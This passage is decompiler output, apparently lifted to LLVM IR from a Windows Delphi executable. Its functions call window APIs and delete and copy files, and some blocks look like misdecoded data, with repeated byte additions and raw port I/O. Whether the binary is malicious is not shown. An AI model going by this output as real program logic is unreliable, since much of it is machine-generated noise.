  %44 = inttoptr i32 %42 to i32*, !insn.addr !1199
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1199
  %46 = icmp eq i1 %45, false, !insn.addr !1200
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1201
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1201

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1202
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1202
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1203
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1203
  br label %dec_label_pc_405c7a, !insn.addr !1203

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1204
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1204
  %51 = load i32, i32* %50, align 4, !insn.addr !1204
  ret i32 %51, !insn.addr !1205
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1206
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1206
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1206
  store i8 %6, i8* %7, align 1, !insn.addr !1206
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1207
  %10 = udiv i32 %4, 256, !insn.addr !1207
  %11 = trunc i32 %10 to i8, !insn.addr !1207
  %12 = add i8 %9, %11, !insn.addr !1207
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1207
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1207
  store i8 %12, i8* %14, align 1, !insn.addr !1207
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1208
  %17 = add i32 %4, 6, !insn.addr !1208
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1208
  %19 = zext i1 %16 to i32, !insn.addr !1208
  %20 = and i32 %4, -65536, !insn.addr !1208
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1209
  %23 = or i1 %16, %22, !insn.addr !1209
  %24 = add i32 %18, 6, !insn.addr !1209
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1209
  %26 = zext i1 %23 to i32, !insn.addr !1209
  %27 = and i32 %25, 15, !insn.addr !1209
  %28 = or i32 %27, %20, !insn.addr !1209
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1209
  %31 = or i32 %28, %30, !insn.addr !1209
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1210
  %33 = load i8, i8* %32, align 1, !insn.addr !1210
  %34 = trunc i32 %27 to i8, !insn.addr !1210
  %35 = xor i8 %33, %34, !insn.addr !1210
  store i8 %35, i8* %32, align 1, !insn.addr !1210
  %36 = add i32 %0, 1311123697, !insn.addr !1211
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1211
  %38 = load i8, i8* %37, align 1, !insn.addr !1211
  %39 = udiv i32 %3, 256, !insn.addr !1211
  %40 = trunc i32 %39 to i8, !insn.addr !1211
  %41 = add i8 %38, %40, !insn.addr !1211
  store i8 %41, i8* %37, align 1, !insn.addr !1211
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1212
  %43 = load i32, i32* %42, align 4, !insn.addr !1212
  %44 = sub i32 %43, %31, !insn.addr !1212
  store i32 %44, i32* %42, align 4, !insn.addr !1212
  %45 = add i32 %3, 117, !insn.addr !1213
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1213
  %47 = load i8, i8* %46, align 1, !insn.addr !1213
  %48 = add i8 %47, %34, !insn.addr !1213
  %49 = icmp eq i8 %48, 0, !insn.addr !1213
  store i8 %48, i8* %46, align 1, !insn.addr !1213
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1214

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1215
  %51 = trunc i32 %3 to i16, !insn.addr !1216
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1216
  %53 = load i32, i32* %52, align 4, !insn.addr !1216
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1216
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1217
  %55 = load i8, i8* %54, align 1, !insn.addr !1217
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1217
  %56 = load i8, i8* %32, align 1, !insn.addr !1218
  %57 = add i8 %56, %34, !insn.addr !1218
  store i8 %57, i8* %32, align 1, !insn.addr !1218
  %58 = call i32 @__asm_iretd(), !insn.addr !1219
  %59 = add i32 %2, -117, !insn.addr !1220
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1220
  %61 = load i8, i8* %60, align 1, !insn.addr !1220
  %62 = add i8 %61, -69, !insn.addr !1220
  store i8 %62, i8* %60, align 1, !insn.addr !1220
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1221
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1222
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1222
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1222
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1223
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1224
  %67 = add i32 %66, 1, !insn.addr !1224
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1224
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1225
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1226
  ret i32 0, !insn.addr !1227

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1228
  store i32 %69, i32* %ebx, align 4, !insn.addr !1229
  %70 = icmp slt i32 %69, 0, !insn.addr !1230
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1231

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1232
  store i32 %71, i32* %ebx, align 4, !insn.addr !1232
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1233
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1234
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1235
  %75 = call i32 @function_403c90(), !insn.addr !1236
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1237
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1238
  br label %dec_label_pc_405d79, !insn.addr !1238

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1239
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1240
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1240
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1240
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1241
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1242
  %3 = add i32 %2, 1, !insn.addr !1242
  %4 = icmp eq i32 %3, 0, !insn.addr !1242
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1242
  %5 = icmp eq i1 %4, false, !insn.addr !1243
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1243

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1244
  br label %dec_label_pc_405da9, !insn.addr !1244

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1245
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1246
  ret i32 0, !insn.addr !1247
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1248
  ret i32 %0, !insn.addr !1248
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1249
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1250
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1251
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1251
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1251
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1252
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1253
  %3 = add i32 %2, -1, !insn.addr !1253
  %4 = icmp eq i32 %2, 0, !insn.addr !1253
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1253
  %5 = icmp eq i1 %4, false, !insn.addr !1254
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1254

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1255
  br label %dec_label_pc_405df4, !insn.addr !1256

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1257
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1258
  ret i32 0, !insn.addr !1259
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1260
  ret i32 %0, !insn.addr !1260
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1261
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1262
}

define i32 @function_405e0c() local_unnamed_addr {
dec_label_pc_405e0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1263
}

define i32 @function_405e0d(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0d:
  %esp.0.reg2mem = alloca i32, !insn.addr !1264
  %eax = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = bitcast i32* %eax to i8*
  %1 = load i8, i8* %0, align 4, !insn.addr !1265
  %2 = load i32, i32* %eax, align 4
  %3 = trunc i32 %2 to i8, !insn.addr !1265
  %4 = add i8 %1, %3, !insn.addr !1265
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1265
  store i8 %4, i8* %5, align 1, !insn.addr !1265
  %6 = load i8, i8* %0, align 4, !insn.addr !1266
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1266
  %9 = add i8 %6, %8, !insn.addr !1266
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1266
  store i8 %9, i8* %10, align 1, !insn.addr !1266
  %11 = load i8, i8* %0, align 4, !insn.addr !1267
  %12 = load i32, i32* %eax, align 4
  %13 = trunc i32 %12 to i8, !insn.addr !1267
  %14 = add i8 %11, %13, !insn.addr !1267
  %15 = inttoptr i32 %12 to i8*, !insn.addr !1267
  store i8 %14, i8* %15, align 1, !insn.addr !1267
  %16 = load i8, i8* %0, align 4, !insn.addr !1268
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !1268
  %19 = add i8 %16, %18, !insn.addr !1268
  %20 = inttoptr i32 %17 to i8*, !insn.addr !1268
  store i8 %19, i8* %20, align 1, !insn.addr !1268
  %21 = load i8, i8* %0, align 4, !insn.addr !1269
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !1269
  %24 = add i8 %21, %23, !insn.addr !1269
  %25 = inttoptr i32 %22 to i8*, !insn.addr !1269
  store i8 %24, i8* %25, align 1, !insn.addr !1269
  %26 = load i8, i8* %0, align 4, !insn.addr !1270
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !1270
  %29 = add i8 %26, %28, !insn.addr !1270
  %30 = inttoptr i32 %27 to i8*, !insn.addr !1270
  store i8 %29, i8* %30, align 1, !insn.addr !1270
  %31 = load i8, i8* %0, align 4, !insn.addr !1271
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !1271
  %34 = add i8 %31, %33, !insn.addr !1271
  %35 = inttoptr i32 %32 to i8*, !insn.addr !1271
  store i8 %34, i8* %35, align 1, !insn.addr !1271
  %36 = load i8, i8* %0, align 4, !insn.addr !1272
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !1272
  %39 = add i8 %36, %38, !insn.addr !1272
  %40 = inttoptr i32 %37 to i8*, !insn.addr !1272
  store i8 %39, i8* %40, align 1, !insn.addr !1272
  %41 = load i8, i8* %0, align 4, !insn.addr !1273
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !1273
  %44 = add i8 %41, %43, !insn.addr !1273
  %45 = inttoptr i32 %42 to i8*, !insn.addr !1273
  store i8 %44, i8* %45, align 1, !insn.addr !1273
  %46 = load i8, i8* %0, align 4, !insn.addr !1274
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !1274
  %49 = add i8 %46, %48, !insn.addr !1274
  %50 = inttoptr i32 %47 to i8*, !insn.addr !1274
  store i8 %49, i8* %50, align 1, !insn.addr !1274
  %51 = load i8, i8* %0, align 4, !insn.addr !1275
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !1275
  %54 = add i8 %51, %53, !insn.addr !1275
  %55 = inttoptr i32 %52 to i8*, !insn.addr !1275
  store i8 %54, i8* %55, align 1, !insn.addr !1275
  %56 = load i8, i8* %0, align 4, !insn.addr !1276
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !1276
  %59 = add i8 %56, %58, !insn.addr !1276
  %60 = inttoptr i32 %57 to i8*, !insn.addr !1276
  store i8 %59, i8* %60, align 1, !insn.addr !1276
  %61 = load i8, i8* %0, align 4, !insn.addr !1277
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !1277
  %64 = add i8 %61, %63, !insn.addr !1277
  %65 = inttoptr i32 %62 to i8*, !insn.addr !1277
  store i8 %64, i8* %65, align 1, !insn.addr !1277
  %66 = load i8, i8* %0, align 4, !insn.addr !1278
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !1278
  %69 = add i8 %66, %68, !insn.addr !1278
  %70 = inttoptr i32 %67 to i8*, !insn.addr !1278
  store i8 %69, i8* %70, align 1, !insn.addr !1278
  %71 = load i8, i8* %0, align 4, !insn.addr !1279
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !1279
  %74 = add i8 %71, %73, !insn.addr !1279
  %75 = inttoptr i32 %72 to i8*, !insn.addr !1279
  store i8 %74, i8* %75, align 1, !insn.addr !1279
  %76 = load i8, i8* %0, align 4, !insn.addr !1280
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !1280
  %79 = add i8 %76, %78, !insn.addr !1280
  %80 = inttoptr i32 %77 to i8*, !insn.addr !1280
  store i8 %79, i8* %80, align 1, !insn.addr !1280
  %81 = load i8, i8* %0, align 4, !insn.addr !1281
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !1281
  %84 = add i8 %81, %83, !insn.addr !1281
  %85 = inttoptr i32 %82 to i8*, !insn.addr !1281
  store i8 %84, i8* %85, align 1, !insn.addr !1281
  %86 = load i8, i8* %0, align 4, !insn.addr !1282
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !1282
  %89 = add i8 %86, %88, !insn.addr !1282
  %90 = inttoptr i32 %87 to i8*, !insn.addr !1282
  store i8 %89, i8* %90, align 1, !insn.addr !1282
  %91 = load i8, i8* %0, align 4, !insn.addr !1283
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !1283
  %94 = add i8 %91, %93, !insn.addr !1283
  %95 = inttoptr i32 %92 to i8*, !insn.addr !1283
  store i8 %94, i8* %95, align 1, !insn.addr !1283
  %96 = load i8, i8* %0, align 4, !insn.addr !1284
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !1284
  %99 = add i8 %96, %98, !insn.addr !1284
  %100 = inttoptr i32 %97 to i8*, !insn.addr !1284
  store i8 %99, i8* %100, align 1, !insn.addr !1284
  %101 = load i8, i8* %0, align 4, !insn.addr !1285
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !1285
  %104 = add i8 %101, %103, !insn.addr !1285
  %105 = inttoptr i32 %102 to i8*, !insn.addr !1285
  store i8 %104, i8* %105, align 1, !insn.addr !1285
  %106 = load i8, i8* %0, align 4, !insn.addr !1286
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !1286
  %109 = add i8 %106, %108, !insn.addr !1286
  %110 = inttoptr i32 %107 to i8*, !insn.addr !1286
  store i8 %109, i8* %110, align 1, !insn.addr !1286
  %111 = load i8, i8* %0, align 4, !insn.addr !1287
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !1287
  %114 = add i8 %111, %113, !insn.addr !1287
  %115 = inttoptr i32 %112 to i8*, !insn.addr !1287
  store i8 %114, i8* %115, align 1, !insn.addr !1287
  %116 = load i8, i8* %0, align 4, !insn.addr !1288
  %117 = load i32, i32* %eax, align 4
  %118 = trunc i32 %117 to i8, !insn.addr !1288
  %119 = add i8 %116, %118, !insn.addr !1288
  %120 = inttoptr i32 %117 to i8*, !insn.addr !1288
  store i8 %119, i8* %120, align 1, !insn.addr !1288
  %121 = load i8, i8* %0, align 4, !insn.addr !1289
  %122 = load i32, i32* %eax, align 4
  %123 = trunc i32 %122 to i8, !insn.addr !1289
  %124 = add i8 %121, %123, !insn.addr !1289
  %125 = inttoptr i32 %122 to i8*, !insn.addr !1289
  store i8 %124, i8* %125, align 1, !insn.addr !1289
  %126 = load i8, i8* %0, align 4, !insn.addr !1290
  %127 = load i32, i32* %eax, align 4
  %128 = trunc i32 %127 to i8, !insn.addr !1290
  %129 = add i8 %126, %128, !insn.addr !1290
  %130 = inttoptr i32 %127 to i8*, !insn.addr !1290
  store i8 %129, i8* %130, align 1, !insn.addr !1290
  %131 = load i8, i8* %0, align 4, !insn.addr !1291
  %132 = load i32, i32* %eax, align 4
  %133 = trunc i32 %132 to i8, !insn.addr !1291
  %134 = add i8 %131, %133, !insn.addr !1291
  %135 = inttoptr i32 %132 to i8*, !insn.addr !1291
  store i8 %134, i8* %135, align 1, !insn.addr !1291
  %136 = load i8, i8* %0, align 4, !insn.addr !1292
  %137 = load i32, i32* %eax, align 4
  %138 = trunc i32 %137 to i8, !insn.addr !1292
  %139 = add i8 %136, %138, !insn.addr !1292
  %140 = inttoptr i32 %137 to i8*, !insn.addr !1292
  store i8 %139, i8* %140, align 1, !insn.addr !1292
  %141 = load i8, i8* %0, align 4, !insn.addr !1293
  %142 = load i32, i32* %eax, align 4
  %143 = trunc i32 %142 to i8, !insn.addr !1293
  %144 = add i8 %141, %143, !insn.addr !1293
  %145 = inttoptr i32 %142 to i8*, !insn.addr !1293
  store i8 %144, i8* %145, align 1, !insn.addr !1293
  %146 = load i8, i8* %0, align 4, !insn.addr !1294
  %147 = load i32, i32* %eax, align 4
  %148 = trunc i32 %147 to i8, !insn.addr !1294
  %149 = add i8 %146, %148, !insn.addr !1294
  %150 = inttoptr i32 %147 to i8*, !insn.addr !1294
  store i8 %149, i8* %150, align 1, !insn.addr !1294
  %151 = load i8, i8* %0, align 4, !insn.addr !1295
  %152 = load i32, i32* %eax, align 4
  %153 = trunc i32 %152 to i8, !insn.addr !1295
  %154 = add i8 %151, %153, !insn.addr !1295
  %155 = inttoptr i32 %152 to i8*, !insn.addr !1295
  store i8 %154, i8* %155, align 1, !insn.addr !1295
  %156 = load i8, i8* %0, align 4, !insn.addr !1296
  %157 = load i32, i32* %eax, align 4
  %158 = trunc i32 %157 to i8, !insn.addr !1296
  %159 = add i8 %156, %158, !insn.addr !1296
  %160 = inttoptr i32 %157 to i8*, !insn.addr !1296
  store i8 %159, i8* %160, align 1, !insn.addr !1296
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1297
  %161 = call i32 @__readfsdword(i32 0), !insn.addr !1298
  store i32 %161, i32* %stack_var_-48, align 4, !insn.addr !1298
  %162 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1298
  call void @__writefsdword(i32 0, i32 %162), !insn.addr !1299
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1300
  %163 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1300
  %164 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1301
  %165 = icmp eq i32 %164, 32770, !insn.addr !1302
  %166 = icmp eq i1 %165, false, !insn.addr !1303
  store i32 %163, i32* %esp.0.reg2mem, !insn.addr !1303
  br i1 %166, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1303

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e0d
  %167 = call i32 @function_407020(), !insn.addr !1304
  %168 = call i32 @"@LStrPos"(), !insn.addr !1305
  %169 = call i32 @"@LStrPos"(), !insn.addr !1306
  %170 = add i32 %169, -1, !insn.addr !1307
  %171 = icmp slt i32 %170, 0, !insn.addr !1308
  %172 = add i32 %168, 2, !insn.addr !1309
  %173 = icmp sgt i32 %172, %170, !insn.addr !1310
  %or.cond = or i1 %171, %173
  store i32 %163, i32* %esp.0.reg2mem, !insn.addr !1311
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1311

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %174 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1312
  store i32 %174, i32* %stack_var_-60, align 4, !insn.addr !1312
  %175 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1312
  %176 = call i32 @"@LStrCopy"(), !insn.addr !1313
  %177 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1314
  %178 = icmp eq i32 %177, 0, !insn.addr !1314
  store i32 %175, i32* %esp.0.reg2mem, !insn.addr !1315
  br i1 %178, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1315

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %179 = call i32 @function_406e08(), !insn.addr !1316
  %180 = call i32 @"@LStrFromPChar"(), !insn.addr !1317
  %181 = call i32 @"@LStrCat"(), !insn.addr !1318
  %182 = call i32 @function_4036c8(), !insn.addr !1319
  %183 = inttoptr i32 %182 to i8*, !insn.addr !1320
  %184 = call i1 @DeleteFileA(i8* %183), !insn.addr !1321
  %185 = call i32 @function_4036c8(), !insn.addr !1322
  %186 = inttoptr i32 %185 to i8*, !insn.addr !1323
  store i8* %186, i8** %stack_var_-76, align 4, !insn.addr !1323
  %187 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1323
  %188 = call i1 @CopyFileA(i8* %186, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1324
  %189 = call i32 @function_405b70(), !insn.addr !1325
  store i32 %187, i32* %esp.0.reg2mem, !insn.addr !1325
  br label %dec_label_pc_405f34, !insn.addr !1325

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %dec_label_pc_405e0d
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %190 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1326
  %191 = load i32, i32* %190, align 4, !insn.addr !1326
  call void @__writefsdword(i32 0, i32 %191), !insn.addr !1327
  %192 = add i32 %esp.0.reload, 8, !insn.addr !1328
  %193 = inttoptr i32 %192 to i32*, !insn.addr !1328
  store i32 4218710, i32* %193, align 4, !insn.addr !1328
  %194 = call i32 @"@LStrArrayClr"(), !insn.addr !1329
  ret i32 %194, !insn.addr !1330
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1331
  ret i32 %0, !insn.addr !1331
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1332
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1333
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1333
  %3 = load i32, i32* %2, align 4, !insn.addr !1333
  ret i32 %3, !insn.addr !1334
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1335
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1335
  store i32 %1, i32* %2, align 4, !insn.addr !1335
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1336
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1336
  %7 = add i8 %4, %6, !insn.addr !1336
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1336
  store i8 %7, i8* %8, align 1, !insn.addr !1336
  %9 = load i32, i32* %eax, align 4, !insn.addr !1337
  ret i32 %9, !insn.addr !1337
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1338
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1338
  store i8 %4, i8* %5, align 1, !insn.addr !1338
  %6 = mul i32 %0, 4096, !insn.addr !1339
  %7 = udiv i32 %0, 1048576, !insn.addr !1339
  %8 = or i32 %7, %6, !insn.addr !1339
  %9 = and i32 %0, 1048576, !insn.addr !1339
  %10 = icmp eq i32 %9, 0, !insn.addr !1339
  %11 = load i32, i32* %edx, align 4, !insn.addr !1340
  %12 = trunc i32 %11 to i16, !insn.addr !1340
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1340
  %14 = sext i8 %13 to i32, !insn.addr !1340
  %15 = or i32 %2, %14, !insn.addr !1340
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1341
  %17 = and i32 %15, -256, !insn.addr !1341
  %18 = or i32 %17, %16, !insn.addr !1341
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1342
  %20 = load i8, i8* %19, align 1, !insn.addr !1342
  %21 = mul i8 %20, 2, !insn.addr !1342
  %22 = lshr i8 %20, 7, !insn.addr !1342
  %23 = or i8 %22, %21, !insn.addr !1342
  store i8 %23, i8* %19, align 1, !insn.addr !1342
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1343
  %26 = udiv i32 %1, 256, !insn.addr !1343
  %27 = trunc i32 %26 to i8, !insn.addr !1343
  %28 = add i8 %25, %27, !insn.addr !1343
  %29 = load i32, i32* %edx, align 4, !insn.addr !1343
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1343
  store i8 %28, i8* %30, align 1, !insn.addr !1343
  %31 = add i32 %8, -4, !insn.addr !1344
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1344
  store i32 4218448, i32* %32, align 4, !insn.addr !1344
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1345
  %34 = sext i1 %33 to i32, !insn.addr !1345
  ret i32 %34, !insn.addr !1346
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
